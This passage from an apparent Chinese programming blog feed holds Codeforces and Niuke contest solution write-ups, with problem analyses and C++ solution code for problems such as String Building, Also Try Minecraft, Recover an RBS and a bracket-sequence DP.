dp[maxn],sum1[maxn],sum2[maxn];</span><br><span class="line"><span class="keyword">int</span> table[maxn];</span><br><span class="line"><span class="comment">//int cmp(int a,int b)&#123;</span></span><br><span class="line"><span class="comment">//return a&lt;b;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123; </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;n,&amp;m,&amp;k);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=k;i++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">b[i]=a[i]/n;</span><br><span class="line">c[i]=a[i]/m;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> flag1=<span class="number">0</span>,flag2=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=k;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(b[i]&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(b[i]!=<span class="number">2</span>)flag1=<span class="number">1</span>;</span><br><span class="line">ans+=b[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ans&gt;=m)&#123;</span><br><span class="line"><span class="keyword">if</span>(!flag1&amp;&amp;m%<span class="number">2</span>)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=k;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(c[i]&lt;<span class="number">2</span>)&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(c[i]!=<span class="number">2</span>)flag2=<span class="number">1</span>;</span><br><span class="line">ans+=c[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//printf(&quot;%d %d\n&quot;,ans,n);</span></span><br><span class="line"><span class="keyword">if</span>(ans&gt;=n)&#123;</span><br><span class="line"><span class="keyword">if</span>(!flag2&amp;&amp;n%<span class="number">2</span>)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line"><span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">cin&gt;&gt;t;</span><br><span class="line"><span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最后说一句吧，就是细节问题真的要考虑周全一点的，小上一波分，但是离1600还是差远了，只能继续努力了，期待下次上大分了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这场打回来一点吧，只是看隔壁div1好像被喷烂了的样子，咱也不懂，也没资格打div1，很多细节没注意到送出去罚时就很难受，本场录屏在B站了，&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="codeforces" scheme="http://example.com/categories/icpc/codeforces/"/>
    
    <category term="题解" scheme="http://example.com/categories/icpc/codeforces/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>Educational Codeforces Round 132(Div.2)分析</title>
    <link href="http://example.com/2022/07/23/Educational%20Codeforces%20Round%20132(Div.2)/"/>
    <id>http://example.com/2022/07/23/Educational%20Codeforces%20Round%20132(Div.2)/</id>
    <published>2022-07-23T13:00:00.000Z</published>
    <updated>2022-07-23T13:17:33.437Z</updated>
    
    <content type="html"><![CDATA[<p>这次的比赛没打，但是自己打估计就是自闭上去的。</p><span id="more"></span><h2 id="A-String-Building"><a href="#A-String-Building" class="headerlink" title="A. String Building"></a>A. String Building</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/23/Educational%20Codeforces%20Round%20132(Div.2)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>给你三个门，每个门后可能有🔑，一个钥匙开一个对应的门，问你是否有办法把所有的门打开。很简单，就那到🔑开个门，换新钥匙，看看能开几个门就可以了。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d&quot;</span>,&amp;a,&amp;b[<span class="number">1</span>],&amp;b[<span class="number">2</span>],&amp;b[<span class="number">3</span>]);</span><br><span class="line">    <span class="keyword">int</span> key=a,cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(key)&#123;</span><br><span class="line">        key=b[key];</span><br><span class="line">        cnt++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cnt==<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Also-Try-Minecraft"><a href="#B-Also-Try-Minecraft" class="headerlink" title="B. Also Try Minecraft"></a>B. Also Try Minecraft</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/23/Educational%20Codeforces%20Round%20132(Div.2)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目说的还是比较清楚的，把minecraft抽象成一个二维世界，只有x和y轴，y轴向下位移会受到摔落伤害，但是上升不会。现在需要执行任务，告诉你每一列的高度，每个任务需要你从一列位移到另一列，问你完成每个任务需要受到多少摔落伤害。</p><p>这题也还可以，很难不想到用前缀和的思路去做。但是因为上升不会扣血或者加血，而它又有可能从后面位移到前面，因此我们需要算出两个前缀和，然后相减即可求得每个人物需要的血量，然后不要忘了开long long。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">int</span> sum1[maxn],sum2[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,q;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    sum1[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        sum1[i]=sum1[i<span class="number">-1</span>]+<span class="built_in">max</span>(a[i]-a[i+<span class="number">1</span>],<span class="number">0ll</span>);</span><br><span class="line">        <span class="comment">//printf(&quot;%d &quot;,sum1[i]);</span></span><br><span class="line">    &#125;<span class="comment">//putchar(10);</span></span><br><span class="line">    sum2[n+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i&gt;<span class="number">1</span>;i--)&#123;</span><br><span class="line">        sum2[i]+=sum2[i+<span class="number">1</span>]+<span class="built_in">max</span>(a[i]-a[i<span class="number">-1</span>],<span class="number">0ll</span>);</span><br><span class="line">        <span class="comment">//printf(&quot;%d &quot;,sum2[i]);</span></span><br><span class="line">    &#125;<span class="comment">//putchar(10);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld&quot;</span>,&amp;n,&amp;q);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;a[i]); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> l,r;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld&quot;</span>,&amp;l,&amp;r);</span><br><span class="line">        <span class="keyword">if</span>(l&lt;r)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,sum1[r<span class="number">-1</span>]-sum1[l<span class="number">-1</span>]);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="comment">//l==8 r==7</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,sum2[r+<span class="number">1</span>]-sum2[l+<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Recover-an-RBS"><a href="#C-Recover-an-RBS" class="headerlink" title="C. Recover an RBS"></a>C. Recover an RBS</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/23/Educational%20Codeforces%20Round%20132(Div.2)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题就是摁贪，从前往后扫一遍计数，当所需的右括号刚好等于问号数量的时候，那就把前面的全部清零，重新计数，看看最后问号数量是否等于左括号的数量即可。那你可能会有疑问，什么时候问号变成左括号呢？问得好，因此我们多出一个，让问号的数量</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> x=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>,q=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;?&#x27;</span>)q++;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;(&#x27;</span>)cnt++;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;)&#x27;</span>)cnt--;</span><br><span class="line">        <span class="keyword">if</span>(q+cnt==<span class="number">1</span>)&#123;</span><br><span class="line">            q=<span class="number">0</span>;</span><br><span class="line">            cnt=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cnt==q)<span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>还是太菜了qwq</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这次的比赛没打，但是自己打估计就是自闭上去的。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="codeforces" scheme="http://example.com/categories/icpc/codeforces/"/>
    
    <category term="题解" scheme="http://example.com/categories/icpc/codeforces/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>牛客多校(2022-7-23)题解</title>
    <link href="http://example.com/2022/07/23/%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A1(2022-7-23)%E9%A2%98%E8%A7%A3/"/>
    <id>http://example.com/2022/07/23/%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A1(2022-7-23)%E9%A2%98%E8%A7%A3/</id>
    <published>2022-07-23T09:00:00.000Z</published>
    <updated>2022-07-23T12:45:15.741Z</updated>
    
    <content type="html"><![CDATA[<p>牛客多校碰到毒瘤括号dp题，题解记录一下。</p><span id="more"></span><h2 id="K题目描述"><a href="#K题目描述" class="headerlink" title="K题目描述"></a>K题目描述</h2><p><img src="/2022/07/23/%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A1(2022-7-23)%E9%A2%98%E8%A7%A3/1.png" alt="1"></p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>给定长度为n的括号序列（不保证合法性），求在此基础上生成的长度为m括号序列的方案数。</p><p>设 $dp[i][j][k]$表示插入括号的数量为 $i$、使用的原来的序列中的括号数量为 $j$，左括号比右括号多 $k$ 时的方案数。那么最终答案为 $dp[m-nl[n][0]$。那么考虑如何设计状态转移：</p><p>首先枚举插入的括号数量，原来的括号序列和左括号比右括号多的数量。<br>如果目前枚举到的括号为左括号，并且使用的原括号的数量$&lt; n$，就可以将该括号放入最终序列中，即为：<br>$$<br>dp[i][j+1][k+1]=(dp[i][j+1][k+1]+dp[i][j][k])%mod<br>$$<br>如果此时枚举到的是一个右括号，并且$k&gt;0$，即左括号的数量大于右括号的数量，并且使用的原括号的数量$&lt;n$，就将该右括号放入最终序列：<br>$$<br>dp[i][j+1][k-1]=(dp[i][j+1][k-1]+dp[i][j][k])%mod<br>$$<br>如果使用的括号数量为 $n$，或当前枚举到右括号，则可以插入左括号：<br>$$<br>dp[i+1][j][k+1]=(dp[i+1][j][k+1]+dp[i][j][k])%mod<br>$$<br>当 $k&gt;0$ 时，如果使用原序列括号的数目为 $n$，或当前枚举到左括号，则可以插入右括号：<br>$$<br>dp[i+1][j][k-1]=(dp[i+1][j][k-1]+dp[i][j][k])%mod<br>$$</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> gcc optimize(2)</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&#x27;\n&#x27;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">2e5</span> + <span class="number">10</span>, mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">220</span>][<span class="number">220</span>][<span class="number">220</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//memset(dp, 0, sizeof(dp));</span></span><br><span class="line">    <span class="keyword">int</span> n, m; cin &gt;&gt; m &gt;&gt; n;</span><br><span class="line">    string s; cin &gt;&gt; s;</span><br><span class="line">    <span class="comment">//if(n &amp; 1 || (m - n) &amp; 1) &#123; cout &lt;&lt; 0 &lt;&lt; endl; return; &#125;</span></span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n - m; ++i)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= m; ++j)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt;= n; ++k)&#123;</span><br><span class="line">            <span class="keyword">if</span> (s[j] == <span class="string">&#x27;(&#x27;</span> &amp;&amp; j &lt; m)</span><br><span class="line">                dp[i][j + <span class="number">1</span>][k + <span class="number">1</span>] = (dp[i][j + <span class="number">1</span>][k + <span class="number">1</span>] + dp[i][j][k]) % mod;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                dp[i + <span class="number">1</span>][j][k + <span class="number">1</span>] = (dp[i + <span class="number">1</span>][j][k + <span class="number">1</span>] + dp[i][j][k]) % mod;</span><br><span class="line">            <span class="keyword">if</span> (k &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span> (s[j] == <span class="string">&#x27;)&#x27;</span> &amp;&amp; j &lt; m)</span><br><span class="line">                    dp[i][j + <span class="number">1</span>][k - <span class="number">1</span>] = (dp[i][j + <span class="number">1</span>][k - <span class="number">1</span>] + dp[i][j][k]) % mod;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i + <span class="number">1</span>][j][k - <span class="number">1</span>] = (dp[i + <span class="number">1</span>][j][k - <span class="number">1</span>] + dp[i][j][k]) % mod;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">cout &lt;&lt; dp[n - m][m][<span class="number">0</span>] &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n + <span class="number">2</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= m + <span class="number">2</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt;= n + <span class="number">2</span>; k++) dp[i][j][k] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios_base::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>), cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> t = <span class="number">1</span>; cin &gt;&gt; t;</span><br><span class="line">    <span class="keyword">while</span>(t--) <span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;牛客多校碰到毒瘤括号dp题，题解记录一下。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="牛客多校" scheme="http://example.com/categories/icpc/%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A1/"/>
    
    <category term="题解" scheme="http://example.com/categories/icpc/%E7%89%9B%E5%AE%A2%E5%A4%9A%E6%A0%A1/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>线段树专题训练</title>
    <link href="http://example.com/2022/07/21/%E7%BA%BF%E6%AE%B5%E6%A0%91%E4%B8%93%E9%A2%98%E8%AE%AD%E7%BB%83/"/>
    <id>http://example.com/2022/07/21/%E7%BA%BF%E6%AE%B5%E6%A0%91%E4%B8%93%E9%A2%98%E8%AE%AD%E7%BB%83/</id>
    <published>2022-07-21T07:00:00.000Z</published>
    <updated>2022-07-21T08:16:21.221Z</updated>
    
